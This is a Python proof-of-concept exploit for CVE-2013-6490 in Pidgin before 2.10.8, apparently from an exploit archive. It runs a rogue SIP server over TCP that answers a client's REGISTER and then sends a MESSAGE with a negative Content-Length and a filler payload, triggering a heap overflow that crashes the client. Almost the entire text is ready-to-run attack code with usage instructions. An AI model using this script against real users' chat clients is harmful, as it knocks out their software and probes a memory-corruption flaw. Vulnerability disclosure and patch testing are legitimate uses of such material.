# CVE-2013-6490: Pidgin before 2.10.8
# Ubuntu 16.04
# by hdbreaker
# This Vulnerability may can be explotable in an old linux system where malloc(0) alloc 16 bytes
# In this condition the vulnerability deal in a heap overflow
# The Vulnerability only exist in the TCP Protocol, UDP is not vulnerable
# I could't write a exploit that derive in a remote code execution
# This code just trigger the crash
# Use: python server.py ip port

import sys
import time
import socket

ip = sys.argv[1]
port = int(sys.argv[2]) # 5060
username = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP
s.bind((ip, port))
s.listen(1)
print "[#] Listening in TCP: "+ip+":"+str(port)

while True:
	connection, client_address = s.accept()
	data = connection.recv(1024) # buffer size is 1024 bytes
	print "Received data: \n"+data
	
	if(data.find("REGISTER") > -1):
		start_index = data.find("From: <sip:")
		username = data[start_index+11:].split('@')[0]
		response = '''SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP station1.work.com\r\nFrom: sip:Collings@work.com\r\nTo: sip:Collins@work.com\r\nCall-ID: 123456@station1.work.com\r\nCSeq: 1 REGISTER\r\nContact: sip:Collins@station1.work.com\r\nExpires: 3600\r\nContent-Length: 0\r\n\r\n'''
		print "[#] Sending response to REGISTER request"
		connection.send(response)
		
  	if(data.find("MESSAGE") > -1):
  		message = '''MESSAGE sip:'''+username+'''@'''+client_address[0]+''' SIP/2.0\r\nVia: SIP/2.0/UDP '''+ip+''':'''+str(port)+''';branch=z9hG4bK7E95360530965DB27E91\r\nFrom: <sip:'''+username+'''@'''+client_address[0]+'''>;tag=2957324760;epid=1234567890\r\nTo: <sip:'''+username+'''@'''+client_address[0]+'''>\r\nMax-Forwards: 10\r\nCSeq: 5 MESSAGE\r\nUser-Agent: Purple/2.10.7\r\nCall-ID: 4302g7DCAa076Ci067Am20D9t62E1b1A76x7430x\r\nContent-Type: text/plain\r\nContent-Length: -1\r\n\r\n'''+"A"*100
		print "[#] Sending MESSAGE"
		connection.send(message)
